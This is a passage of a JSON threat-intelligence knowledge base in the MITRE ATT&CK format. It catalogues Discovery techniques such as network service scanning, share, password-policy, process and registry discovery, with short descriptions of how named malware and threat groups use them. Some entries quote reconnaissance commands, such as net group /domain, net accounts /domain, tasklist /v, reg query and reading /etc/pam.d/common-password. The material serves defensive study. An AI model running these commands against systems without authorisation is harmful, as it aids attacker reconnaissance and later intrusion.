                    "Description": "Orz can gather victim drive information.[61]"
                },
                {
                    "Name": "OwaAuth",
                    "Description": "OwaAuth has a command to list its directory and logical drives.[42]"
                },
                {
                    "Name": "Pasam",
                    "Description": "Pasam creates a backdoor through which remote attackers can retrieve lists of files.[62]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions.[63][13]"
                },
                {
                    "Name": "PinchDuke",
                    "Description": "PinchDuke searches for files created within a certain timeframe and whose file extension matches a predefined list.[39]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader has commands to list drives on the victim machine and to list file information for a given directory.[64]"
                },
                {
                    "Name": "POORAIM",
                    "Description": "POORAIM can conduct file browsing.[24]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.[65]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may enumerate user directories on a victim.[66]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.[67]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc lists files in directories.[55]"
                },
                {
                    "Name": "Psylo",
                    "Description": "Psylo has commands to enumerate all storage devices and to find all files that start with a particular string.[59]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon identifies files matching certain file extension and copies them to subdirectories it created.[68]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can walk through directories and recursively search for strings in files.[69]"
                },
                {
                    "Name": "RARSTONE",
                    "Description": "RARSTONE obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.[70]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can enumerate and search for files and directories.[71][21]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec is capable of listing contents of folders on the victim. Remsec also searches for custom network encryption software on victims.[72][73][74]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover automatically searches for files on local drives based on a predefined list of file extensions.[75]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can scan victim drives to look for specific banking software on the machine to determine next actions. It also looks at browsing history and open tabs for specific strings.[76]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon attempts to access the ADMIN$, C$\\Windows, D$\\Windows, and E$\\Windows shares on the victim with its current privileges.[77]"
                },
                {
                    "Name": "SHOTPUT",
                    "Description": "SHOTPUT has a command to obtain a directory listing.[78]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader recursively searches through directories for files.[79]"
                },
                {
                    "Name": "SOUNDBITE",
                    "Description": "SOUNDBITE is capable of enumerating and manipulating files and directories.[80]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.[81]"
                },
                {
                    "Name": "SPACESHIP",
                    "Description": "SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time.[12]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx has the ability to enumerate drive types.[82]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck checks its directory location in an attempt to avoid launching in a sandbox.[83][84]"
                },
                {
                    "Name": "TINYTYPHON",
                    "Description": "TINYTYPHON searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.[10]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip[85]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, and in the Program Files directory.[86]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can search directories for files on the victim’s machine.[87]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT has the capability to gather the victim's current directory.[88]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer searches victim drives for files matching certain extensions (\".skr\",\".pkr\" or \".key\") or names.[89][90]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can list directories on a victim.[91]"
                },
                {
                    "Name": "WINERACK",
                    "Description": "WINERACK can enumerate files and directories.[24]"
                },
                {
                    "Name": "WinMM",
                    "Description": "WinMM sets a WH_CBT Windows hook to search for and capture files on the victim.[92]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.[93]"
                },
                {
                    "Name": "yty",
                    "Description": "yty gathers information on victim’s drives and has a plugin for document listing.[94]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib has the ability to enumerate files and drives.[31]"
                }
            ]
        },
        "Network Service Scanning": {
            "Name": "Network Service Scanning",
            "Description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.\n",
            "ID": "T1046",
            "Tactic": "Discovery",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "Administrator, SYSTEM, User",
            "Data Sources: ": "Netflow/Enclave netflow, Network protocol analysis, Packet capture, Process command-line parameters, Process use of network",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has conducted port scans on a host.[1]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.[2][3][4]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can perform port scans from an infected host.[5]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[6]"
                },
                {
                    "Name": "HDoor",
                    "Description": "HDoor scans to identify open ports on the victim.[7]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can scan for open TCP ports on the target network.[8]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer scanned network services to search for vulnerabilities in the victim system.[9]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest.[10]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to scan for open ports on hosts in a connected network.[11]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.[12]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy has a built-in module for port scanning.[13]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec has a plugin that can perform ARP scanning as well as port scanning.[14]"
                },
                {
                    "Name": "Suckfly",
                    "Description": "Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open.[15]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems.[16]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "XTunnel is capable of probing the network for open ports.[17]"
                }
            ]
        },
        "Network Share Discovery": {
            "Name": "Network Share Discovery",
            "Description": "Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. WindowsFile sharing over a Windows network occurs over the SMB protocol. [1] [2]Net can be used to query a remote system for available shared drives using the net view \\remotesystem command. It can also be used to query shared drives on the local system using net share.Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.MacOn Mac, locally mounted shares can be viewed with the df -aH command.\n",
            "ID": "T1135",
            "Tactic": "Discovery",
            "Platform: ": "macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Network protocol analysis, Process use of network",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can query shared drives on the local system.[3]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.[4][5]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can gather network share information.[6]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can scan local network for open SMB.[7]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects a list of network shares with the command net share.[8]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to retrieve information about shares on remote hosts.[9]"
                },
                {
                    "Name": "Net",
                    "Description": "The net view \\remotesystem and net share commands in Net can be used to find shared drives and directories on remote and local systems respectively.[10]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo discovers shares on the network[11]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can list local and remote shared drives and folders over SMB.[12]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug listed remote shared drives that were accessible from a victim.[13]"
                }
            ]
        },
        "Password Policy Discovery": {
            "Name": "Password Policy Discovery",
            "Description": "Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems. [1] [2]Windowsnet accountsnet accounts /domainLinuxchage -l cat /etc/pam.d/common-passwordmacOSpwpolicy getaccountpolicies\n",
            "ID": "T1201",
            "Tactic": "Discovery",
            "Platform: ": "Windows, Linux, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process command-line parameters, Process monitoring",
            "Contributors: ": "Sudhanshu Chauhan, @Sudhanshu_C",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects password policy information with the command net accounts.[3]"
                },
                {
                    "Name": "Net",
                    "Description": "The net accounts and net accounts /domain commands with Net can be used to obtain password policy information.[4]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used net.exe in a script with net accounts /domain to find the password policy of a domain.[5]"
                }
            ]
        },
        "Peripheral Device Discovery": {
            "Name": "Peripheral Device Discovery",
            "Description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.\n",
            "ID": "T1120",
            "Tactic": "Discovery",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can list connected devices.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[2]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.[3][4]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy can gather very specific information about attached USB devices, to include device instance ID and drive geometry.[5]"
                },
                {
                    "Name": "Equation",
                    "Description": "Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.[6]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "Gamaredon Group tools contained an application to check performance of USB flash drives.[7]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind obtains the number of removable drives from the victim.[8]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka collects information on available printers and disk drives.[9]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can obtain a list of smart card readers attached to the victim.[10]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 searches through connected drives for removable storage devices.[11]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.[12]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.[13]"
                }
            ]
        },
        "Permission Groups Discovery": {
            "Name": "Permission Groups Discovery",
            "Description": "Adversaries may attempt to find local system or domain-level groups and permissions settings. WindowsExamples of commands that can list groups are net group /domain and net localgroup using the Net utility.MacOn Mac, this same thing can be accomplished with the dscacheutil -q group for the domain, or dscl . -list /Groups for local groups.LinuxOn Linux, local groups can be enumerated with the groups command and domain groups via the ldapsearch command.\n",
            "ID": "T1069",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-576",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: net localgroup administrator >> %temp%\\download[1]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can enumerate the permissions associated with Windows groups.[2]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used batch scripts to enumerate administrators in the environment.[3]"
                },
                {
                    "Name": "dsquery",
                    "Description": "dsquery can be used to gather information on permission groups within a domain.[4]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary has the capability to execute the command net localgroup administrators.[5]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth has checked for the local admin group domain admin group and Exchange Trusted Subsystem groups using the commands net group Exchange Trusted Subsystem /domain and net group domain admins /domain.[6]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can obtain the victim user name.[7]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar gathers information about local groups and members.[8]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang performs discovery of permission groups net group /domain.[9]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects lists of local accounts with administrative access, local group user accounts, and domain local groups with the commands net localgroup administrators, net localgroup users, and net localgroup /domain.[10]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to retrieve information about groups.[11]"
                },
                {
                    "Name": "Net",
                    "Description": "Commands such as net group and net localgroup can be used in Net to gather information about and manipulate groups.[12]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used net group /domain, net localgroup administrators, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to find group permission settings on a victim.[13]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo specifically looks for Domain Admins, Power Users, and the Administrators groups within the domain and locally[2]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect permission group information by running net group /domain or a series of other commands on a victim.[14]"
                },
                {
                    "Name": "Sys10",
                    "Description": "Sys10 collects the group name of the logged-in user and sends it to the C2.[15]"
                }
            ]
        },
        "Process Discovery": {
            "Name": "Process Discovery",
            "Description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.WindowsAn example command that would obtain details on processes is \"tasklist\" using the Tasklist utility.Mac and LinuxIn Mac and Linux, this is accomplished with the ps command.\n",
            "ID": "T1057",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-573",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "4H RAT",
                    "Description": "4H RAT has the capability to obtain a listing of running processes (including loaded modules).[1]"
                },
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can list running processes.[2]"
                },
                {
                    "Name": "APT28",
                    "Description": "An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[3]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can list out currently running processes.[4][5]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37's Freenki malware lists running processes using the Microsoft Windows API.[6]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea collects information about running processes.[7]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE may collect information about running processes.[8]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot identifies processes and collects the process ids.[9]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT can list running processes.[10]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal can obtain a list of running processes on the victim’s machine.[11]"
                },
                {
                    "Name": "BLACKCOFFEE",
                    "Description": "BLACKCOFFEE has the capability to discover processes.[12]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has gathered a process list by using Tasklist.exe.[13][14]"
                },
                {
                    "Name": "Brave Prince",
                    "Description": "Brave Prince lists the running processes.[15]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak lists running processes.[16]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes collects its process identifier (PID) on the victim.[17]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike's \"beacon\" payload can collect information on process details.[18]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses the tasklist to view running processes on the victim’s machine.[19]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a command to list processes.[20]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.[21]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi collects current and parent process IDs.[22][23]"
                },
                {
                    "Name": "Duqu",
                    "Description": "The discovery modules used with Duqu can collect information on process details.[24]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky collects information about running processes from victims.[25]"
                },
                {
                    "Name": "ELMER",
                    "Description": "ELMER is capable of performing process listings.[26]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher checks its parent process for indications that it is running in a sandbox setup.[27][28]"
                },
                {
                    "Name": "FruitFly",
                    "Description": "FruitFly has the ability to list processes on the system.[29]"
                },
                {
                    "Name": "GeminiDuke",
                    "Description": "GeminiDuke collects information on running processes and environment variables from the victim.[30]"
                },
                {
                    "Name": "gh0st",
                    "Description": "gh0st RAT is able to list processes.[31]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon checks the running processes on the victim’s machine.[15]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT lists the running processes on the system.[32]"
                },
                {
                    "Name": "HALFBAKED",
                    "Description": "HALFBAKED can obtain information about running processes on the victim.[33]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth has used Tasklist to get information on processes.[3]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee gathers a list of processes using the tasklist command and then is sent back to the control server.[34]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can monitor processes.[35][36]"
                },
                {
                    "Name": "iKitten",
                    "Description": "iKitten lists the current processes running.[29]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole obtains a list of running processes.[37]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT obtains a list of running processes on the victim.[38][39]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can list running processes.[40]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to search for a given process name in processes currently running in the system.[41]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar obtains a list of running processes through WMI querying and the ps command.[42]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang performs process discovery using tasklist commands.[43][44]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE can obtain a list of running processes on the system.[45]"
                },
                {
                    "Name": "Komplex",
                    "Description": "The OsInfo function in Komplex collects a running process list.[46]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects a list of running services with the command tasklist /v.[47]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.[48][49][50][51]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can retrieve a list of running processes.[52]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware can list running processes.[53]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder has a command to upload information about all running processes to its C2 server.[54]"
                },
                {
                    "Name": "Molerats",
                    "Description": "Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.[25]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind has a command to return a list of running processes.[55]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito runs tasklist to obtain running processes.[56]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT uses tasklist /v to check running processes.[57]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "NETEAGLE can send process listings over the C2 channel.[8]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has run tasklist on a victim's machine.[58]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz can gather a process list from the victim.[59]"
                },
                {
                    "Name": "Pasam",
                    "Description": "Pasam creates a backdoor through which remote attackers can retrieve lists of running processes.[60]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE performs the tasklist command to list running processes.[61]"
                },
                {
                    "Name": "POORAIM",
                    "Description": "POORAIM can enumerate processes.[62]"
                },
                {
                    "Name": "Poseidon Group",
                    "Description": "After compromising a victim, Poseidon Group lists all running processes.[63]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has a command to list the victim's processes.[64]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.[65][66]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect process information by running tasklist on a victim.[67]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc lists processes running on the system.[51]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can list the running processes and get the process ID and parent process’s ID.[68]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA lists the system’s processes.[69][70]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can obtain a process list from the victim.[71]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.[72]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT lists the current running processes on the system.[73]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can obtain information about process integrity levels.[74]"
                },
                {
                    "Name": "SHOTPUT",
                    "Description": "SHOTPUT has a command to obtain a process listing.[75]"
                },
                {
                    "Name": "Socksbot",
                    "Description": "Socksbot can list all running processes.[76]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware gathers a list of running processes.[77]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx has the ability to enumerate processes.[78]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot may gather a list of running processes by running tasklist /v.[79]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck enumerates all running processes.[80][81]"
                },
                {
                    "Name": "Tasklist",
                    "Description": "Tasklist can be used to discover processes running on a system.[82]"
                },
                {
                    "Name": "Trojan.Karagany",
                    "Description": "Trojan.Karagany can use tasklist to collect a list of running tasks.[7]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover running processes using the tasklist /v command.[83]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN can get a list of the processes and running tasks on the system.[84]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can gather a list of processes.[85]"
                },
                {
                    "Name": "WINERACK",
                    "Description": "WINERACK can enumerate processes.[62]"
                },
                {
                    "Name": "WinMM",
                    "Description": "WinMM sets a WH_CBT Windows hook to collect information on process creation.[86]"
                },
                {
                    "Name": "Winnti Group",
                    "Description": "Winnti Group looked for a specific process running on infected servers.[87]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the getProcessList function to run ps aux to get running processes.[88]"
                },
                {
                    "Name": "yty",
                    "Description": "yty gets an output of running processes using the tasklist command.[89]"
                }
            ]
        },
        "Query Registry": {
            "Name": "Query Registry",
            "Description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security. [1] Some of the information may help adversaries to further their operation within a network.\n",
            "ID": "T1012",
            "Tactic": "Discovery",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Windows Registry, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can enumerate registry keys.[2][3]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE is capable of enumerating and making modifications to an infected system's Registry.[4]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot searches for certain Registry keys to be configured before executing the payload.[5]"
                },
                {
                    "Name": "Brave Prince",
                    "Description": "Brave Prince gathers information about the Registry.[6]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information.[7]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK provides access to the Windows Registry, which can be used to gather information.[8]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of enumerating Registry keys and values.[9]"
                },
                {
                    "Name": "DownPaper",
                    "Description": "DownPaper searches and reads the value of the Windows Update Registry Run key.[10]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 queried the Registry to identify victim information.[11]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information.[12]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher queries Registry values as part of its anti-sandbox checks.[13][14]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[6]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.[15][16]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can enumerate Registry values, keys, and data.[17]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can enumerate Registry keys.[18]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.[19][20][21]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" on a victim to query the Registry.[22]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo queries the registry to look for information about Terminal Services.[23]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can query for information contained within the Windows Registry.[24]"
                },
                {
                    "Name": "POWERSOURCE",
                    "Description": "POWERSOURCE queries Registry keys in preparation for setting Run keys to achieve persistence.[25]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.[26][27]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may query the Registry by running reg query on a victim.[28]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.[29]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.[30]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses the command reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings\".[31]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver queries the Registry to determine the correct Startup path to use for persistence.[32]"
                },
                {
                    "Name": "Reg",
                    "Description": "Reg may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.[33]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT accesses the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.[34]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon queries several Registry keys to identify hard disk partitions to overwrite.[35]"
                },
                {
                    "Name": "Stealth Falcon",
